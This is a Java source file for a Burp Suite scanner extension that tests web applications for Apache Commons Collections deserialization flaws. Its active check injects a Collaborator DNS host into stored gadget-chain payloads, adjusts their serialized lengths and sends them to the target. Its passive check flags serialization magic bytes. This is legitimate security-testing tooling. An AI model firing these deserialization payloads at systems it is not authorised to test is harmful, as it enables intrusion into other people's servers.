package org.example;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.Collaborator;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.collaborator.InteractionFilter;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.core.Marker;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.utilities.Utilities;

import java.util.ArrayList;
import java.util.List;


public class _7CustomScanCheck implements ScanCheck {
    MontoyaApi api;
    Utilities utilities;
    CollaboratorClient collaboratorClient;
    private byte[] serializationMagicBytes = {(byte)0xac, (byte)0xed, (byte)0x00, (byte)0x05};
    private byte[] base64MagicBytes = {(byte)0x72, (byte)0x4f, (byte)0x30, (byte)0x41};

    public _7CustomScanCheck(MontoyaApi api){
        this.api = api;
        this.utilities = this.api.utilities();
        this.collaboratorClient=this.api.collaborator().createClient();
    }

    public ByteArray createDnsPayload(ByteArray genericPayload, String collaboratorURL) {

        String hostTokenString = "XXXXX";

        int indexPlaceholderFirstUrlCharacter = genericPayload.indexOf(hostTokenString, true);
        int indexPlaceholderLastUrlCharacter = indexPlaceholderFirstUrlCharacter + hostTokenString.length() -1;

        int newCollaboratorVectorLength = collaboratorURL.length();

        ByteArray payloadPortionBeforeUrl = genericPayload.subArray(0, indexPlaceholderFirstUrlCharacter);
        ByteArray payloadPortionAfterUrl = genericPayload.subArray(indexPlaceholderLastUrlCharacter+1, genericPayload.length());

        payloadPortionBeforeUrl.setByte(payloadPortionBeforeUrl.length()-1, (byte)newCollaboratorVectorLength);

        ByteArray payloadWithCollaboratorUrl = payloadPortionBeforeUrl.withAppended(ByteArray.byteArray(collaboratorURL));
        payloadWithCollaboratorUrl = payloadWithCollaboratorUrl.withAppended(payloadPortionAfterUrl);

        // Adjust one more length in the serialization process when the TemplateImpl object is used for exploitation
        ByteArray patternTemplateImplToSearch = ByteArray.byteArray(new byte[]{(byte)0xf8,(byte)0x06,(byte)0x08,(byte)0x54,(byte)0xe0,(byte)0x02,(byte)0x00,(byte)0x00,(byte)0x78,(byte)0x70,(byte)0x00,(byte)0x00,(byte)0x06});
        int indexOfPatternTemplateImpl = payloadWithCollaboratorUrl.indexOf(patternTemplateImplToSearch,false);
        if(indexOfPatternTemplateImpl != -1)
            payloadWithCollaboratorUrl.setByte(indexOfPatternTemplateImpl+13, (byte)(payloadWithCollaboratorUrl.getByte(indexOfPatternTemplateImpl+13) + (newCollaboratorVectorLength - 5)));

        return payloadWithCollaboratorUrl;

    }

    @Override
    public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint){
        List<AuditIssue> activeAuditIssues = new ArrayList<AuditIssue>();
        for (int i=0;i<_7StaticItems.apacheCommonsCollections3Payloads.length;i++){
            String collabUrl = collaboratorClient.generatePayload().toString();
            ByteArray payloadWithCollabUrl = utilities.base64Utils().encode(
                    createDnsPayload(
                           utilities.base64Utils().decode(_7StaticItems.apacheCommonsCollections3Payloads[i]),
                           collabUrl ));
            HttpRequest commonsCollectionsRequest = auditInsertionPoint.buildHttpRequestWithPayload
                    (payloadWithCollabUrl).withService(baseRequestResponse.httpService());
            HttpRequestResponse commonsCollectionsResponse = api.http().sendRequest(commonsCollectionsRequest);
            List<Interaction> interactionList = collaboratorClient.getInteractions(
                    InteractionFilter.interactionPayloadFilter(collabUrl));
            if (interactionList.size()>0){
               AuditIssue auditIssue = AuditIssue.auditIssue(
                       _7StaticItems.apacheCommonsCollections3IssueName,
                       _7StaticItems.apacheCommonsCollections3IssueDetail,
                       null,
                       baseRequestResponse.request().url(),
                       _7StaticItems.apacheCommonsCollections3IssueSeverity,
                       _7StaticItems.apacheCommonsCollections3IssueConfidence,
                       null,
                       null,
                       _7StaticItems.apacheCommonsCollections3IssueTypicalSeverity,
                       commonsCollectionsResponse
               );
               activeAuditIssues.add(auditIssue);
           }

        }
        return AuditResult.auditResult(activeAuditIssues);
    }

    @Override
    public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {
        if (newIssue.name().equals(existingIssue.name()) && newIssue.baseUrl().equals(existingIssue.baseUrl())){
            return ConsolidationAction.KEEP_EXISTING;
        } else return ConsolidationAction.KEEP_BOTH;
    }

    @Override
    public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse){
        List<AuditIssue> passiveAuditIssues = new ArrayList<AuditIssue>();
        ByteArray requestBytes = baseRequestResponse.request().toByteArray();
        int indexOfSerializationBytes = requestBytes.indexOf(ByteArray.byteArray(serializationMagicBytes));
        int indexOfBase64Bytes = requestBytes.indexOf(ByteArray.byteArray(base64MagicBytes));
        if (indexOfBase64Bytes != -1 || indexOfSerializationBytes != -1){
            int startIndex;
            if (indexOfBase64Bytes != -1){
                startIndex = indexOfBase64Bytes;
            } else {
                startIndex = indexOfSerializationBytes;
            }
            int endIndex=startIndex+4;

            List<Marker> highlights = new ArrayList<Marker>();
            Marker marker = Marker.marker(startIndex,endIndex);
            highlights.add(marker);

            AuditIssue auditIssue = AuditIssue.auditIssue(
                    _7StaticItems.passiveSerializationIssueName,
                    _7StaticItems.passiveSerializationIssueDetail,
                    null,
                    baseRequestResponse.request().url(),
                    _7StaticItems.passiveSerializationIssueSeverity,
                    _7StaticItems.passiveSerializationIssueConfidence,
                    null,
                    null,
                    _7StaticItems.passiveSerializationIssueTypicalSeverity,
                    baseRequestResponse.withRequestMarkers(highlights)
            );
            passiveAuditIssues.add(auditIssue);

        }
        return AuditResult.auditResult(passiveAuditIssues);
    }
}
